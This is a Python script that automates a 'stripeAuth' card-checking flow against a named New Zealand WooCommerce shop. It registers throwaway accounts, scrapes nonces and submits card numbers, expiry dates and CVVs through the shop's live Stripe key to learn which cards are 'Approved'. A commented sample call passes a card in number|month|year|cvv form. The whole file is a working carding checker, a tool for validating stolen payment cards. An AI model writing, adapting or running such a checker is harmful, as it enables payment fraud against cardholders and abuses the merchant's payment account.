import httpx
import string
import random
import asyncio
from datetime import datetime

def capture(response,start,end):
	x = response.split(start)[1]
	z = x.split(end)[0]
	return z

def generate(length):
	lower = string.ascii_lowercase
	digits = string.digits
	return ''.join(random.choices(lower+digits,k=length))

async def stripeAuth(card,client):
	cc,mes,ano,cvv = map(str.strip,card.split('|'))
	email = f"{generate(8)}@gmail.com"
	headers = {
	    'authority': 'chiwahwah.co.nz',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-IN,en;q=0.9',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
	    }
	response = await client.get('https://chiwahwah.co.nz/my-account/',headers=headers)
	register_nonce = capture(response.text,'woocommerce-register-nonce" value="','"')
	#print(register_nonce)
	#open("test.html","w").write(response)
	headers = {
	    'authority': 'chiwahwah.co.nz',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-IN,en;q=0.9',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://chiwahwah.co.nz',
	    'referer': 'https://chiwahwah.co.nz/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'email': email,
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://chiwahwah.co.nz/my-account/add-payment-method/',
	    'wc_order_attribution_session_start_time': datetime.now(),
	    'wc_order_attribution_session_pages': '1',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'woocommerce-register-nonce': register_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'register': 'Register',
	}
	response = await client.post('https://chiwahwah.co.nz/my-account/add-payment-method/', cookies=client.cookies, headers=headers, data=data,follow_redirects=True)
	intent_nonce = capture(response.text,'createSetupIntentNonce":"','"')
	#print(intent_nonce)
	#open("test.html","w").write(response)
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-IN,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}

	data = f'billing_details[name]=+&billing_details[email]={email}&billing_details[address][country]=IN&type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={ano}&card[exp_month]={mes}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F22a1c02c9a%3B+stripe-js-v3%2F22a1c02c9a%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fchiwahwah.co.nz&time_on_page=61847&client_attribution_metadata[client_session_id]=1b383cd1-b498-490b-ba24-4a40c5032f1e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1RQy6lFzHo5ZntEQ'
	
	response = await client.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		token = response.json()["id"]
	except KeyError:
		return "INCORRECT_NUMBER"
	#print(token)
	
	headers = {
	    'authority': 'chiwahwah.co.nz',
	    'accept': '*/*',
	    'accept-language': 'en-IN,en;q=0.9',
	    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhCQZlfjKf0J0ISJF',
	    'origin': 'https://chiwahwah.co.nz',
	    'referer': 'https://chiwahwah.co.nz/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	files = {
	    'action': (None, 'create_setup_intent'),
	    'wcpay-payment-method': (None, token),
	    '_ajax_nonce': (None, intent_nonce.strip()),
	}
	
	response = await client.post('https://chiwahwah.co.nz/wp-admin/admin-ajax.php', headers=headers, files=files,follow_redirects=True)
	open("test.html","w").write(response.text)
	if response.json()["success"]:
		msg = "Approved ✅"
	elif not response.json()["success"]:
		msg = response.json()["data"]["error"]["message"]
	else:
		msg = response.text
	return msg

#client = httpx.AsyncClient(timeout=30)
#x = asyncio.run(stripeAuth("5444223894000539|02|28|500",client))
#print(x)